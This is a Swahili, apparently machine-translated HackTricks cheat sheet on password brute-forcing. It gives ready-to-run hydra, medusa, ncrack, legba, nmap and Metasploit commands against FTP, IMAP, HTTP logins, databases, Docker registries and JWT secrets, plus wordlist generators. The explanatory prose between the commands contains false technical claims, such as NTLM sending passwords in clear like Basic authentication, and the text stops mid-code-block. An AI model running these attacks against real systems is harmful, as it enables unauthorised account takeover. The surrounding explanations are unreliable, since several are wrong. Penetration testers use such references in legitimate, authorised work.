# Brute Force - CheatSheet

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia taratibu za kiotomatiki** zinazotumia zana za jamii ya **kisasa zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Vitambulisho vya Chaguo-msingi

**Tafuta kwenye google** vitambulisho vya chaguo-msingi vya teknolojia inayotumiwa, au **jaribu viungo hivi**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Jenga Dictionaries yako Mwenyewe**

Pata habari nyingi kuhusu lengo kama unavyoweza na tengeneza kamusi ya kipekee. Zana ambazo zinaweza kusaidia:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl ni chombo cha kupata maneno muhimu kutoka kwa ukurasa wa wavuti. Inafanya hivyo kwa kuchambua ukurasa na kuchukua maneno yote yanayofanana na maneno ya msingi yaliyotolewa. Chombo hiki kinaweza kuwa muhimu katika mchakato wa kuvunja nguvu kwa sababu kinaweza kusaidia kupata maneno muhimu ambayo yanaweza kutumiwa kama jaribio la kuingia kwa nguvu. 

Cewl inaweza kufanya kazi kwa kuchambua ukurasa wa wavuti uliopewa au kwa kuchambua faili ya maandishi iliyotolewa. Inachukua maneno yote yanayofanana na maneno ya msingi na kuyahifadhi kwenye faili ya maandishi. Chombo hiki kinaweza kusanidiwa kwa kutumia vigezo mbalimbali kama vile kina cha kina, kikomo cha maneno, na zaidi. 

Kwa kuanza na Cewl, unahitaji kufunga chombo hiki kwenye mfumo wako. Baada ya kufunga, unaweza kuitumia kwa kutoa URL ya ukurasa wa wavuti au faili ya maandishi kama kiingilio. Cewl itachambua kiingilio hicho na kutoa faili ya maandishi inayojumuisha maneno muhimu yaliyopatikana. 

Kwa kumalizia, Cewl ni chombo muhimu katika mchakato wa kuvunja nguvu kwa sababu kinaweza kusaidia kupata maneno muhimu ambayo yanaweza kutumiwa kama jaribio la kuingia kwa nguvu. Inaweza kutumika kuchambua ukurasa wa wavuti au faili ya maandishi na kutoa faili ya maandishi inayojumuisha maneno muhimu yaliyopatikana.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Zalisha nywila kwa kutumia maarifa yako kuhusu mwathiriwa (majina, tarehe...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Wister ni chombo cha kuzalisha orodha ya maneno, kinachokuwezesha kutoa seti ya maneno, kwa kukupa uwezo wa kutengeneza mabadiliko mengi kutoka kwenye maneno yaliyotolewa, kwa kuunda orodha ya maneno ya kipekee na bora kutumia kuhusiana na lengo maalum.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Orodha za Maneno

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia taratibu** zilizowekwa na zana za jamii zilizo **za juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Huduma

Zimeorodheshwa kwa herufi kwa jina la huduma.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP (Apache JServ Protocol) ni itifaki ya mtandao inayotumiwa kwa mawasiliano kati ya seva ya wavuti na seva ya programu ya Java. Inaruhusu seva ya wavuti kutuma ombi la kuchakata kwa seva ya programu ya Java na kupokea majibu. AJP inaweza kutumika kwa njia ya kuingilia kati na kudukua mawasiliano kati ya seva hizi mbili.

Kuna njia kadhaa za kudukua mawasiliano ya AJP, ikiwa ni pamoja na kujaribu kuingia kwa nguvu (brute force) kwenye seva ya AJP. Kwa kufanya hivyo, mshambuliaji anaweza kujaribu kuchunguza nywila za mtumiaji au kufanya shughuli zisizo halali kwenye seva ya programu ya Java.

Kuna zana nyingi zinazopatikana kwa kudukua mawasiliano ya AJP, kama vile `ajp-buster` na `ajp-enum`. Zana hizi zinaweza kutumiwa kwa ufanisi kugundua udhaifu na kutekeleza mashambulizi ya kuingilia kati kwenye mawasiliano ya AJP.

Ni muhimu kwa wataalamu wa usalama wa mtandao kuelewa jinsi AJP inavyofanya kazi na jinsi ya kuzuia mashambulizi ya kuingilia kati kwenye mawasiliano ya AJP. Kwa kufanya hivyo, wanaweza kuchukua hatua za kulinda seva zao na data dhidi ya vitisho vya usalama.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM na Solace)

AMQP (Advanced Message Queuing Protocol) ni itifaki ya mawasiliano ambayo inaruhusu mawasiliano kati ya wakalimani na wapokeaji wa ujumbe. Inatumika sana katika mifumo ya ujumbe wa foleni kama vile ActiveMQ, RabbitMQ, Qpid, JORAM na Solace.

### Kuvunja Nguvu ya AMQP

Kuvunja nguvu ya AMQP kunahusisha kujaribu kuingia kwenye mfumo wa AMQP kwa kutumia mbinu ya kuvunja nguvu. Hapa kuna njia kadhaa za kufanya hivyo:

1. **Kuvunja Nguvu ya Nywila**: Kwa kutumia orodha ya maneno au orodha ya nywila zilizopatikana, unaweza kujaribu kuingia kwenye mfumo wa AMQP kwa kujaribu kila nywila moja kwa moja.

2. **Kuvunja Nguvu ya Nywila kwa kutumia Dictionary**: Unaweza pia kutumia orodha ya maneno ya kawaida au orodha ya nywila iliyoboreshwa ili kujaribu kuvunja nguvu ya nywila kwenye mfumo wa AMQP.

3. **Kuvunja Nguvu ya Nywila kwa kutumia Brute Force**: Kwa kutumia mbinu ya kuvunja nguvu ya brute force, unaweza kujaribu kila kombinisheni iwezekanavyo ya herufi na nambari ili kuvunja nguvu ya nywila kwenye mfumo wa AMQP.

4. **Kuvunja Nguvu ya Nywila kwa kutumia Rainbow Tables**: Unaweza kutumia meza za upinde wa mvua, ambazo ni orodha ya nywila zilizohashiriwa na zilizohifadhiwa kwa urahisi, ili kuvunja nguvu ya nywila kwenye mfumo wa AMQP.

5. **Kuvunja Nguvu ya Nywila kwa kutumia Hydra**: Hydra ni chombo cha kuvunja nguvu kinachoweza kutumika kwa AMQP. Inaruhusu kujaribu nywila nyingi kwa wakati mmoja kwa kutumia orodha ya maneno au orodha ya nywila.

6. **Kuvunja Nguvu ya Nywila kwa kutumia Medusa**: Medusa ni chombo kingine cha kuvunja nguvu kinachoweza kutumika kwa AMQP. Inaruhusu kujaribu nywila nyingi kwa wakati mmoja kwa kutumia orodha ya maneno au orodha ya nywila.

Kumbuka: Kabla ya kujaribu kuvunja nguvu ya AMQP, hakikisha una idhini sahihi na unazingatia sheria na kanuni zinazohusiana na uhalifu wa mtandao.
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
### Cassandra

Cassandra ni mfumo wa hifadhidata ya wazi ambao unaruhusu uhifadhi wa data kwenye seva nyingi. Inatumia mfano wa usambazaji wa data ili kuhakikisha upatikanaji wa juu na utendaji bora. Kwa sababu ya muundo wake wa usambazaji, Cassandra inaweza kushughulikia mzigo mkubwa wa data na kuwa imara zaidi kuliko mfumo wa hifadhidata ya jadi.

Kwa kufanya jaribio la nguvu kwenye mfumo wa Cassandra, unaweza kujaribu kuvunja nywila au kubaini ufikiaji usio halali kwa kutumia mbinu ya nguvu ya kubadilisha nywila. Hii inahusisha kujaribu idadi kubwa ya nywila tofauti kwa kutumia programu maalum au skrini ya kuingia ili kupata ufikiaji usio halali.

Kuna njia kadhaa za kufanya jaribio la nguvu kwenye mfumo wa Cassandra, ikiwa ni pamoja na kutumia zana kama Hydra au Medusa. Hizi zana zinaweza kusanidiwa kwa kutumia orodha ya nywila inayowezekana au kwa kujaribu nywila zote zinazowezekana kwa kutumia algorithm ya kubadilisha nywila.

Ni muhimu kuzingatia kuwa kufanya jaribio la nguvu kwenye mfumo wa Cassandra bila idhini inaweza kuwa kinyume cha sheria. Ni muhimu kufuata sheria na kanuni zinazohusiana na uhalifu wa mtandao na kuhakikisha kuwa unafanya jaribio la nguvu tu kwa mfumo ambao una idhini ya mmiliki.
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
### CouchDB

CouchDB ni mfumo wa hifadhidata ya hati ambao unaruhusu kuhifadhi na kupata hati kwa kutumia itifaki ya HTTP. Ni mfumo wa hifadhidata ambao unaruhusu kuhifadhi hati za JSON na kuzipata kwa kutumia maombi ya HTTP.

#### Kuvunja Nguvu kwa Kutumia Brute Force

Kuvunja nguvu kwa kutumia brute force ni mbinu ya kuvunja mfumo wa usalama kwa kujaribu kila uwezekano wa nywila hadi kupata nywila sahihi. Kwa CouchDB, unaweza kutumia mbinu hii kujaribu kuingia kwenye akaunti ya mtumiaji kwa kujaribu nywila tofauti.

Kuna zana nyingi zinazopatikana kwa kuvunja nguvu kwa kutumia brute force kwenye CouchDB. Unaweza kutumia zana kama Hydra, Medusa, au Burp Suite kwa kufanya jaribio la kuvunja nguvu kwenye mfumo wa CouchDB.

Kabla ya kuanza jaribio la kuvunja nguvu, ni muhimu kufanya uchunguzi wa awali ili kupata habari muhimu kama vile jina la mtumiaji, anwani ya IP ya lengo, na uwezekano wa nywila. Uchunguzi huu unaweza kufanywa kwa kutumia zana kama Nmap, Shodan, au Censys.

Baada ya kupata habari muhimu, unaweza kuanza jaribio la kuvunja nguvu kwa kutumia zana zilizotajwa hapo awali. Kumbuka kuwa kuvunja nguvu kwa kutumia brute force ni kinyume cha sheria na inaweza kusababisha madhara makubwa. Kwa hivyo, ni muhimu kufanya jaribio hili tu kwa idhini ya mmiliki wa mfumo au kwa madhumuni ya kujifunza na kuboresha usalama wa mfumo wako mwenyewe.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Docker Registry

Docker Registry ni huduma inayotumiwa kuhifadhi na kusimamia picha za Docker. Inaruhusu watumiaji kupakia, kushiriki, na kupakua picha za Docker kutoka kwa uhifadhi wa kijijini au wa mbali. Kwa kawaida, Docker Registry hutumiwa kama seva ya kuhifadhi picha za Docker ili ziwepo kwa urahisi na kupatikana kwa watumiaji wengine.

Kuna aina mbili za Docker Registry: Docker Hub na Docker Private Registry. Docker Hub ni huduma ya umma inayotolewa na Docker ambayo inaruhusu watumiaji kushiriki na kupakua picha za Docker. Docker Private Registry, kwa upande mwingine, ni uhifadhi wa kibinafsi ambao unaweza kuendeshwa kwenye seva yako mwenyewe au kwenye wingu la kibinafsi.

Kwa kawaida, Docker Registry inalindwa na hatua za usalama ili kuzuia upatikanaji usioidhinishwa. Mojawapo ya njia za kawaida za kulinda Docker Registry ni kutumia uthibitishaji wa msingi wa jina la mtumiaji na nenosiri. Hii inahitaji watumiaji kuingia kwa kutumia jina la mtumiaji na nenosiri kabla ya kupakia au kupakua picha za Docker.

Kwa kuwa Docker Registry inaweza kuwa na picha nyingi, kuna uwezekano wa kufanya mashambulizi ya nguvu kwa kutumia orodha ya majina ya mtumiaji na nywila. Hii inajulikana kama "brute force attack". Katika mashambulizi haya, hacker anajaribu majina tofauti ya mtumiaji na nywila hadi atakapopata mchangiaji sahihi. Kwa hivyo, ni muhimu kwa wamiliki wa Docker Registry kuchukua hatua za ziada za usalama kama vile kuzuia majaribio mengi ya kuingia na kufuatilia shughuli za usajili ili kugundua na kuzuia mashambulizi ya nguvu.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

Elasticsearch ni mfumo wa utafutaji wa wazi na wa kusambazwa ambao hutumiwa kuhifadhi na kutafuta data. Ni maarufu sana kwa utendaji wake wa haraka na uwezo wake wa kushughulikia data kubwa.

#### Kuvunja Nguvu kwenye Elasticsearch

Kuvunja Nguvu ni mbinu ya kujaribu kuingia kwenye mfumo kwa kujaribu idadi kubwa ya maneno au nywila hadi kupata ile sahihi. Kwa Elasticsearch, kuna njia kadhaa za kuvunja nguvu ambazo zinaweza kutumika:

1. **Dictionary Attack**: Kuvunja Nguvu kwa kutumia orodha ya maneno au nywila maarufu. Hii inahusisha kujaribu kila neno au nywila kutoka kwenye orodha mpaka kupatikane ile sahihi.

2. **Brute Force Attack**: Kuvunja Nguvu kwa kujaribu kila kombinasi ya herufi na nambari. Hii inahusisha kujaribu kila uwezekano wa nywila hadi kupatikane ile sahihi.

3. **Credential Stuffing**: Kuvunja Nguvu kwa kutumia nywila zilizovuja kutoka kwenye tovuti nyingine. Hii inahusisha kujaribu nywila zilizovuja kwenye Elasticsearch na matumaini ya kuwa watumiaji wengi hutumia nywila sawa kwenye tovuti zingine.

4. **Password Spraying**: Kuvunja Nguvu kwa kujaribu nywila chache sana kwa kila akaunti. Hii inazuia kugunduliwa kwa sababu jaribio la kuvunja nguvu linaweza kufanywa kwa kasi ndogo.

Ni muhimu kuchukua hatua za kiusalama ili kuzuia kuvunja nguvu kwenye Elasticsearch. Hii inaweza kujumuisha kuanzisha sera kali za nywila, kuzuia jaribio la kuingia mara kwa mara, na kusasisha mfumo na toleo la karibuni la Elasticsearch ili kuepuka udhaifu uliojulikana.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP (File Transfer Protocol) ni itifaki ya mtandao inayotumiwa kusambaza faili kati ya kompyuta mbili kwenye mtandao. Kwa kawaida, FTP hutumia kitambulisho cha jina la mtumiaji na nenosiri ili kuthibitisha upatikanaji wa faili. 

Mbinu ya kuvunja FTP kwa nguvu hutumia jaribio la kiotomatiki la kuingia kwenye akaunti ya FTP kwa kutumia orodha ya maneno au nenosiri. Hii inaweza kufanywa kwa kutumia programu maalum za kuvunja nguvu kama Hydra au Medusa. 

Kwa kawaida, mbinu hii inahitaji orodha ya maneno au nenosiri inayowezekana ambayo inajaribiwa moja kwa moja dhidi ya akaunti ya FTP. Mbinu hii inaweza kuwa yenye ufanisi ikiwa nenosiri linalotarajiwa linajulikana au ikiwa orodha ya maneno inayowezekana imepunguzwa kwa ufanisi. 

Ni muhimu kutambua kuwa kuvunja FTP kwa nguvu ni shughuli haramu na inaweza kusababisha mashtaka ya kisheria. Kwa hivyo, ni muhimu kufuata sheria na kanuni zinazohusiana na matumizi ya mbinu hii.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### Kuvunja Nguvu Kwa Kutumia HTTP

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### Uthibitishaji wa Msingi wa HTTP
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM

NTLM ni itifaki ya uwakilishi wa kitambulisho inayotumiwa katika mazingira ya Windows kwa kusudi la uwakilishi wa kitambulisho cha mtumiaji. Inatumika sana katika mifumo ya uendeshaji ya Windows na huduma za mtandao.

NTLM inatumia mbinu ya kuthibitisha kwa kutumia msimbo wa kuingia kwa msingi wa uthibitishaji wa msingi (Basic Authentication). Hii inamaanisha kuwa jina la mtumiaji na nenosiri vinatumwa kwa seva kwa njia ya wazi, ambayo inaweza kuwa hatari ikiwa mawasiliano hayalindwi vizuri.

Mbinu ya kuvunja nguvu ya NTLM inahusisha kujaribu kila uwezekano wa nenosiri hadi kupata moja sahihi. Kuna zana nyingi zinazopatikana kwa kusudi hili, kama vile Hydra, Medusa, na Ncrack.

Kwa kawaida, mbinu hii inachukua muda mrefu sana kwa sababu ya idadi kubwa ya uwezekano wa nenosiri. Walakini, inaweza kuwa yenye ufanisi ikiwa nenosiri ni dhaifu au linategemea msingi wa kawaida kama majina ya watumiaji, tarehe za kuzaliwa, au maneno maarufu.

Ni muhimu kutambua kuwa kuvunja nguvu ya NTLM ni shughuli ya kiharamia na inaweza kusababisha madhara makubwa. Kwa hivyo, inapaswa kufanywa tu kwa idhini ya mmiliki wa mfumo husika.
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - Fomu ya Kutuma (Post)

Kutuma fomu ya HTTP ni njia ya kawaida ya kuwasilisha data kwenye seva. Mara nyingi, fomu hizi zinatumika kwa usajili, kuingia, au kutuma maombi mengine kwenye tovuti.

Kwa kufanya shambulio la nguvu, tunaweza kutumia mbinu ya kujaribu kila uwezekano wa data ya kuingiza kwenye fomu ili kupata ufikiaji usio halali au kufichua habari nyeti.

Kuna zana nyingi za kufanya shambulio la nguvu kwenye fomu za HTTP, kama vile Hydra, Burp Suite, au wfuzz. Zana hizi zinaweza kutumiwa kwa kujaribu majina ya mtumiaji na nywila, au hata kujaribu maadili tofauti ya kuingiza kwenye fomu.

Kabla ya kuanza shambulio la nguvu, ni muhimu kuelewa muundo wa fomu na jinsi data inavyotumwa kwenye seva. Kwa kawaida, fomu ya HTTP inatumia njia ya POST, ambayo inatumia mwili wa ombi kuwasilisha data. Data inaweza kuwa katika muundo wa fomu ya urlencode au json, na inaweza kuwa na vigezo tofauti kulingana na fomu husika.

Kwa kufanya shambulio la nguvu kwenye fomu ya HTTP, tunaweza kujaribu kubadilisha vigezo tofauti kama majina ya mtumiaji, nywila, au maadili mengine ya kuingiza. Kwa kila jaribio, tunapaswa kuchambua jibu la seva ili kubaini ikiwa jaribio limefanikiwa au la.

Ni muhimu kutambua kuwa shambulio la nguvu linaweza kuwa mchakato wa muda mrefu na unaweza kuhitaji rasilimali nyingi. Kwa hivyo, ni muhimu kuwa na mpango mzuri na kuzingatia sheria na kanuni za kisheria wakati wa kufanya shambulio la nguvu.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
Kwa http**s** unahitaji kubadilisha kutoka "http-post-form" hadi "**https-post-form"**

### **HTTP - CMS --** (W)ordpress, (J)oomla au (D)rupal au (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
### IMAP

IMAP (Internet Message Access Protocol) ni itifaki ya mtandao inayotumiwa na wateja wa barua pepe kuungana na seva ya barua pepe na kupata ujumbe wa barua pepe. IMAP inaruhusu watumiaji kusimamia na kusawazisha ujumbe wa barua pepe kwenye seva, kuruhusu ufikiaji wa barua pepe kutoka kwa vifaa tofauti.

Kwa kawaida, wateja wa barua pepe hutumia IMAP kusoma, kutuma, na kusimamia ujumbe wa barua pepe kwenye seva. IMAP inatoa huduma nyingi, kama vile uwezo wa kuunda folda, kusawazisha hali ya ujumbe, na kusimamia vitambulisho vya ujumbe.

Kwa wadukuzi, IMAP inaweza kuwa njia ya kuvunja usalama wa akaunti za barua pepe. Kwa kutumia mbinu ya "brute force", wadukuzi wanaweza kujaribu kuingia kwenye akaunti za barua pepe kwa kujaribu nywila tofauti kwa kutumia programu maalum au skrini ya kuingia. Hii inaweza kufanyika kwa kutumia orodha ya maneno ya kawaida, orodha ya nywila zilizovuja, au kwa kujaribu nywila zote zinazowezekana.

Kwa hiyo, ni muhimu kwa watumiaji kulinda akaunti zao za barua pepe kwa kutumia nywila ngumu na kufuatilia shughuli zisizo za kawaida kwenye akaunti zao. Pia, watoa huduma za barua pepe wanapaswa kutekeleza hatua za usalama kama vile kuzuia jaribio la kuingia kwa nguvu na kufuatilia shughuli za kutiliwa shaka.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
### IRC

IRC (Internet Relay Chat) ni mfumo wa mawasiliano ya kuishi ambao hutumiwa kwa mazungumzo ya kikundi kupitia mtandao. IRC inaruhusu watumiaji kujiunga na vituo vya mazungumzo na kushiriki katika mazungumzo ya moja kwa moja na watumiaji wengine. 

Kwa wadukuzi, IRC inaweza kutumika kama njia ya kufanya mashambulizi ya nguvu. Kwa kutumia programu maalum za kudukua, wadukuzi wanaweza kujaribu kuingia kwenye akaunti za watumiaji kwa kujaribu nywila tofauti kwa njia ya kiotomatiki. Hii inajulikana kama shambulio la nguvu. 

Shambulio la nguvu linaweza kufanikiwa ikiwa nywila ya mtumiaji ni dhaifu au rahisi kuhesabika. Kwa hivyo, ni muhimu kwa watumiaji kuwa na nywila zenye nguvu na ngumu ili kuzuia mashambulizi ya nguvu.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

ISCSI ni itifaki ya mtandao inayotumiwa kuunganisha na kufikia uhifadhi wa data kwenye mtandao. Inaruhusu watumiaji kuunganisha na kudhibiti diski za mbali kwa njia ya mtandao. Kwa kawaida, ISCSI hutumiwa katika mazingira ya seva na uhifadhi wa data.

Kwa kufanya uchunguzi wa kina wa ISCSI, unaweza kugundua maelezo muhimu kama vile anwani za IP za seva za ISCSI, majina ya mtumiaji na nywila, na habari nyingine muhimu. Habari hii inaweza kutumiwa kwa njia mbalimbali, ikiwa ni pamoja na kujaribu kuvunja nywila kwa kutumia mbinu ya nguvu ya kubadilisha nywila.

Kuna zana nyingi zinazopatikana kwa ajili ya kufanya mashambulizi ya nguvu ya kubadilisha nywila kwenye itifaki ya ISCSI. Zana hizi zinaweza kujaribu nywila nyingi kwa kasi kubwa, na hivyo kuongeza nafasi ya kufanikiwa kwa shambulio.

Ni muhimu kuzingatia kuwa kufanya mashambulizi ya nguvu ya kubadilisha nywila kwenye itifaki ya ISCSI ni kinyume cha sheria na inaweza kusababisha madhara makubwa. Ni muhimu kufuata sheria na kanuni za maadili wakati wa kufanya uchunguzi wa aina hii.
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JWT (Json Web Token) ni njia ya kawaida ya kuthibitisha kitambulisho kwenye mfumo wa mtandao. Inatumia muundo wa JSON kwa kuweka data ya kitambulisho na inasainiwa kwa kutumia siri ya siri. JWT ina sehemu tatu: kichwa (header), mwili (payload), na saini (signature).

#### Kuvunja JWT

Kuna njia kadhaa za kuvunja JWT:

1. **Brute Force**: Kwa kutumia nguvu ya kompyuta, unaweza kujaribu kila uwezekano wa siri ya siri ili kupata saini sahihi ya JWT.
2. **Dictionary Attack**: Unaweza kutumia orodha ya maneno ya kawaida au nywila zilizovuja kutoka kwa ukiukaji wa data ili kujaribu kuvunja JWT.
3. **Algorithm Weakness**: Ikiwa JWT imesainiwa kwa kutumia algorithm dhaifu, unaweza kutumia udhaifu huo kuvunja JWT.
4. **Key Leakage**: Ikiwa siri ya siri ya JWT imevuja au imeibiwa, unaweza kutumia siri hiyo kuvunja JWT.
5. **RS/HS Confusion**: Ikiwa mfumo unachanganya matumizi ya algorithm za RS (asymmetrical) na HS (symmetrical), unaweza kujaribu kuvunja JWT kwa kuchanganya algorithms hizo.

#### Kuzuia Mashambulizi ya Kuvunja JWT

Kuna hatua kadhaa unazoweza kuchukua kuzuia mashambulizi ya kuvunja JWT:

1. **Tumia Algorithms Salama**: Hakikisha kuwa unatumia algorithms salama na nguvu kwa kusaini JWT.
2. **Tumia Siri ya Siri Iliyo ngumu**: Chagua siri ya siri yenye nguvu na ngumu ambayo ni vigumu kuvunjwa kwa nguvu.
3. **Tumia Muda Mfupi wa Uhai wa JWT**: Weka muda mfupi wa uhai wa JWT ili kupunguza fursa za mashambulizi ya kuvunja JWT.
4. **Tumia Mfumo wa Kuzuia Mashambulizi**: Tumia mfumo wa kuzuia mashambulizi kama vile kuzuia IP, kugundua shughuli za kushuku, na kufuatilia matumizi ya JWT.
5. **Tumia Algorithms za Kusaini Salama**: Chagua algorithms za kusaini JWT ambazo ni salama na zimehakikiwa.

Kwa kufuata hatua hizi za kuzuia, unaweza kuimarisha usalama wa JWT na kuzuia mashambulizi ya kuvunja JWT.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
